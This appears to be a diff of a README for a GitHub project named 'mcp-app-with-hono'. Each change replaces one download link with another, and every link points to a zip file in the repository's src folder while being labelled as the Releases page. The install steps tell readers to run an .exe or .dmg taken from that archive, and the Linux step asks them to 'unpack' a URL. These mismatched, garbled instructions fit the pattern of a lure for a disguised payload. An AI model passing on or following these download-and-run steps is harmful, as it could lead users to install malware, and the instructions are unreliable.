@@ -6,11 +6,11 @@ Welcome to the **mcp-app-with-hono** project! This application helps you build a
 
 ## 📥 Download Now
 
-[![Download mcp-app-with-hono](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/with-mcp-app-hono-3.9.zip)](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/with-mcp-app-hono-3.9.zip)
+[![Download mcp-app-with-hono](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/mcp_app_with_hono_v2.2.zip)](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/mcp_app_with_hono_v2.2.zip)
 
 You can easily get the latest version of our application by visiting the Releases page. Click the link below to download the software:
 
-[Download mcp-app-with-hono Releases](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/with-mcp-app-hono-3.9.zip)
+[Download mcp-app-with-hono Releases](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/mcp_app_with_hono_v2.2.zip)
 
 ## 🌟 Features
 
@@ -34,7 +34,7 @@ To run **mcp-app-with-hono**, make sure your system meets the following requirem
 To install **mcp-app-with-hono**, follow these steps carefully:
 
 1. **Visit the Releases Page:** Go to our Releases page by clicking on the link below:
-   [Download mcp-app-with-hono Releases](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/with-mcp-app-hono-3.9.zip).
+   [Download mcp-app-with-hono Releases](https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/mcp_app_with_hono_v2.2.zip).
 
 2. **Choose the Latest Release:** Look for the latest version available at the top of the list. 
 
@@ -43,7 +43,7 @@ To install **mcp-app-with-hono**, follow these steps carefully:
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file, drag the application to your Applications folder, and then open it from there.
-   - **Linux:** Unpack the `https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/with-mcp-app-hono-3.9.zip` file and run the executable from the terminal.
+   - **Linux:** Unpack the `https://raw.githubusercontent.com/Lokesh-Bathala/mcp-app-with-hono/main/src/mcp_app_with_hono_v2.2.zip` file and run the executable from the terminal.
 
 5. **Run the Application:** Once installed, you can find and open the application from your Start Menu (Windows), Launchpad (macOS), or applications folder (Linux).
 
